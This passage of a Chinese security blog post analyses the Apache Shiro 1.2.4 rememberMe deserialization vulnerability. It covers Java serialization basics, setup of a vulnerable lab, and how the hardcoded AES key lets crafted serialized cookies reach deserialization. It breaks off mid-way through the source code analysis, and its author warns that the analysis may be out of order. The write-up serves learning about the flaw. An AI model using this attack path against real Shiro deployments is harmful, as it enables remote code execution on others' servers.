<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="一、前言⚠️ 该文章只作学习记录，其文章深度并不能作为学习研究所用，文章漏洞代码分析部分或有乱序，请不要将该文章作为正确的漏洞分析文章，可直接转至参考文章学习漏洞原理。 二、Java 序列化与反序列化Java 序列化 是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream 类的 writeObject() 方法可以实现序列化。  Java反序">
<meta property="og:type" content="article">
<meta property="og:title" content="Shiro反序列化漏洞分析">
<meta property="og:url" content="http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="世间闲客·此闲行">
<meta property="og:description" content="一、前言⚠️ 该文章只作学习记录，其文章深度并不能作为学习研究所用，文章漏洞代码分析部分或有乱序，请不要将该文章作为正确的漏洞分析文章，可直接转至参考文章学习漏洞原理。 二、Java 序列化与反序列化Java 序列化 是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream 类的 writeObject() 方法可以实现序列化。  Java反序">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/shiro/image-20220928202955004.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20220928203618300-16643686711181.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20220928203753728.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20220928203915011.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20220928203035559.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20220928203130826.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20220928204038094-16643688406673.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20220928205231718.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20220928205446844.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20220928205531084.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20220928210335367.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20220928210423508.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20220928205046633.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221001165149272.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221001170316531.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221001170628404.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221001171009787.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221001202501429.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221001202758070.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221001203541265.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221001204041201.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221001204642446.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221001204916754.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221001205605497.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221001205850975.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221002105038632.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221002105113490.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221002105212735.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221002111915882.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221002110713564.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221002111026239.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221002111502727.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221002112059260.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221002112234044.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221002102940381.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221002103109939.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221002103257797.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003210457908.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003210757811.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003210905788.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003211707942.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003211532163.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003211913642.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003212030943.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003212136191.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003212959172.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003213037441.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003214114011.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003214254415.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003214813621.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003220946760.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003221058326.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003221158962.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003222145191.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221003222431550.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221015103652468-16658190654921.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221015103818676.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221015143616770.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221015143557298.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221015143803339.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221015144055376-16658217756221.png">
<meta property="og:image" content="http://example.com/images/shiro/image-20221015144009953.png">
<meta property="article:published_time" content="2022-10-04T08:27:36.000Z">
<meta property="article:modified_time" content="2023-04-04T15:29:04.000Z">
<meta property="article:author" content="Funsiooo">
<meta property="article:tag" content="Java代码审计">
<meta property="article:tag" content="Shiro反序列化">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/shiro/image-20220928202955004.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/logo-1.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/logo-1.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo-1.png">
        
      
    
    <!-- title -->
    <title>Shiro反序列化漏洞分析</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />

<meta name="generator" content="Hexo 5.4.2"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>

<body class="max-width mx-auto px3 ">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     --><!--
       --><li><a href="/tags/">标签</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2022/10/07/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-SSRF/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2022/10/02/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%89)-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=Shiro反序列化漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro反序列化漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=Shiro反序列化漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Shiro反序列化漏洞分析&body=Check out this article: http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro反序列化漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro反序列化漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro反序列化漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro反序列化漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=Shiro反序列化漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=Shiro反序列化漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Java-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">二、Java 序列化与反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">三、漏洞环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">四、漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text">1、漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">2、代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90"><span class="toc-number">4.2.1.</span> <span class="toc-text">加密分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90"><span class="toc-number">4.2.2.</span> <span class="toc-text">解密分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">5.</span> <span class="toc-text">五、漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E7%A1%AE%E8%AE%A4%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8-Shiro-%E6%A1%86%E6%9E%B6"><span class="toc-number">5.1.</span> <span class="toc-text">1、确认是否使用 Shiro 框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">5.2.</span> <span class="toc-text">2、漏洞探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.3.</span> <span class="toc-text">3、漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81Linux-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">5.4.</span> <span class="toc-text">4、Linux 反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%B0%8F%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">六、小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">7.</span> <span class="toc-text">七、参考文章</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Shiro反序列化漏洞分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Funsiooo</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-10-04T08:27:36.000Z" itemprop="datePublished">2022-10-04</time>
        
        (Updated: <time datetime="2023-04-04T15:29:04.000Z" itemprop="dateModified">2023-04-04</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">Java代码审计</a>, <a class="tag-link-link" href="/tags/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">Shiro反序列化</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>⚠️ 该文章只作学习记录，其文章深度并不能作为学习研究所用，文章漏洞代码分析部分或有乱序，请不要将该文章作为正确的漏洞分析文章，可直接转至参考文章学习漏洞原理。</p>
<h2 id="二、Java-序列化与反序列化"><a href="#二、Java-序列化与反序列化" class="headerlink" title="二、Java 序列化与反序列化"></a>二、Java 序列化与反序列化</h2><p><code>Java 序列化</code> 是指把 Java <code>对象</code>转换为<code>字节序列</code>的过程便于保存在内存、文件、数据库中，<code>ObjectOutputStream</code> 类的 <code>writeObject()</code> 方法可以实现序列化。 </p>
<p><code>Java反序列化</code> 是指把<code>字节序列</code>恢复为 Java <code>对象</code> 的过程，<code>ObjectInputStream</code> 类的 <code>readObject()</code> 方法用于反序列化。</p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">          <span class="comment">//定义obj对象</span></span><br><span class="line">        String obj=<span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">          <span class="comment">//创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line">        FileOutputStream fos=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectOutputStream os=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">          <span class="comment">//writeObject()方法将obj对象写入object文件</span></span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line">          <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">          <span class="comment">//恢复对象</span></span><br><span class="line">        String obj2=(String)ois.readObject();</span><br><span class="line">        System.out.print(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。</p>
<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；</span><br><span class="line">在网络上传送对象的字节序列,接收方接收到字符序列后，使用反序列化从字节序列中恢复出Java对象;</span><br></pre></td></tr></table></figure></div>
<br/>


<hr>
<h2 id="三、漏洞环境搭建"><a href="#三、漏洞环境搭建" class="headerlink" title="三、漏洞环境搭建"></a>三、漏洞环境搭建</h2><p>1、Shiro源码下载，并导入 IDEA</p>
<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</span><br></pre></td></tr></table></figure></div>

<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928202955004.png" data-caption="image-20220928202955004"><img src="/../images/shiro/image-20220928202955004.png" alt="image-20220928202955004"></a></p>
<p>2、配置 tomcat 环境</p>
<p>配置 tomcat 前先配置文件输出路径，不然后续配置 tomcat 会因为没有定义输出路径而报错</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928203618300-16643686711181.png" data-caption="image-20220928203618300"><img src="/../images/shiro/image-20220928203618300-16643686711181.png" alt="image-20220928203618300"></a></p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928203753728.png" data-caption="image-20220928203753728"><img src="/../images/shiro/image-20220928203753728.png" alt="image-20220928203753728"></a></p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928203915011.png" data-caption="image-20220928203915011"><img src="/../images/shiro/image-20220928203915011.png" alt="image-20220928203915011"></a></p>
<p>配置 tomcat</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928203035559.png" data-caption="image-20220928203035559"><img src="/../images/shiro/image-20220928203035559.png" alt="image-20220928203035559"></a><br><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928203130826.png" data-caption="image-20220928203130826"><img src="/../images/shiro/image-20220928203130826.png" alt="image-20220928203130826"></a><br><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928204038094-16643688406673.png" data-caption="image-20220928204038094"><img src="/../images/shiro/image-20220928204038094-16643688406673.png" alt="image-20220928204038094"></a></p>
<p>指定漏洞 shiro 反序列漏洞 war 包</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928205231718.png" data-caption="image-20220928205231718"><img src="/../images/shiro/image-20220928205231718.png" alt="image-20220928205231718"></a></p>
<p>点击右上角运行符号</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928205446844.png" data-caption="image-20220928205446844"><img src="/../images/shiro/image-20220928205446844.png" alt="image-20220928205446844"></a><br>成功搭建</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928205531084.png" data-caption="image-20220928205531084"><img src="/../images/shiro/image-20220928205531084.png" alt="image-20220928205531084"></a></p>
<p>配置本地IP 方便 burp抓包</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928210335367.png" data-caption="image-20220928210335367"><img src="/../images/shiro/image-20220928210335367.png" alt="image-20220928210335367"></a><br><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928210423508.png" data-caption="image-20220928210423508"><img src="/../images/shiro/image-20220928210423508.png" alt="image-20220928210423508"></a></p>
<p>配置 JDK</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928205046633.png" data-caption="image-20220928205046633"><img src="/../images/shiro/image-20220928205046633.png" alt="image-20220928205046633"></a></p>
<h2 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h2><h3 id="1、漏洞原理"><a href="#1、漏洞原理" class="headerlink" title="1、漏洞原理"></a>1、漏洞原理</h3><p>Shiro≤1.2.4 版本默认使用 CookieRememberMeManager，持久化地将信息序列化后加密后保存在 Cookie 的 rememberMe 字段中，当系统下次读取时先进行解密再反序列化从而获取信息。由于该版本内置了一个默认且固定的由 AES 加密 的硬编码 Key 值 ，因此攻击者可通过使用默认的 Key 对恶意构造的序列化数据进行加密，当 CookieRememberMeManager 对恶意的 rememberMe 进行处理时，最终会对恶意数据进行反序列化，从而导致反序列化漏洞。</p>
<p>用户获取请求，系统主要处理过程：<code>获取 Cookie 中 rememberMe 的值 -》 对 rememberMe 进行 Base64 解码 -》使用 AES 进行解密 -》对解密的值进行反序列化</code></p>
<h3 id="2、代码分析"><a href="#2、代码分析" class="headerlink" title="2、代码分析"></a>2、代码分析</h3><h4 id="加密分析"><a href="#加密分析" class="headerlink" title="加密分析"></a>加密分析</h4><p><code>shiro-shiro-root-1.2.4/core/src/main/java/org/apache/shiro/mgtorg/apache/shiro/mgt/DefaultSecurityManager.java</code> 代码中可知，由 rememberMeSuccessfulLogin 方法，定义是否登录成功，创建对象 rmm</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001165149272.png" data-caption="image-20221001165149272"><img src="/../images/shiro/image-20221001165149272.png" alt="image-20221001165149272"></a></p>
<p>跟进对象的 rmm 的 onSuccessfulLogin 方法，通过全局搜索定位到 onSuccessfulLogin 实现代码位于 AbstractRememberMeManager.java</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001170316531.png" data-caption="image-20221001170316531"><img src="/../images/shiro/image-20221001170316531.png" alt="image-20221001170316531"></a></p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> &#123;</span><br><span class="line">    <span class="comment">//always clear any previous identity:</span></span><br><span class="line">    forgetIdentity(subject);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now save the new identity:</span></span><br><span class="line">    <span class="keyword">if</span> (isRememberMe(token)) &#123;</span><br><span class="line">        rememberIdentity(subject, token, info);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;AuthenticationToken did not indicate RememberMe is requested.  &quot;</span> +</span><br><span class="line">                      <span class="string">&quot;RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


<p>利用 forgetIdentity 方法对 subject 进行处理</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001170628404.png" data-caption="image-20221001170628404"><img src="/../images/shiro/image-20221001170628404.png" alt="image-20221001170628404"></a></p>
<p>继续跟进 forgetIdentity 方法，查看其具体实现代码，定位到实现代码位置为 CookieRememberMeManager.java</p>
<p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001171009787.png" data-caption="image-20221001171009787"><img src="/../images/shiro/image-20221001171009787.png" alt="image-20221001171009787"></a></p>
<p>代码如下：</p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">forgetIdentity</span><span class="params">(Subject subject)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (WebUtils.isHttp(subject)) &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(subject);</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> 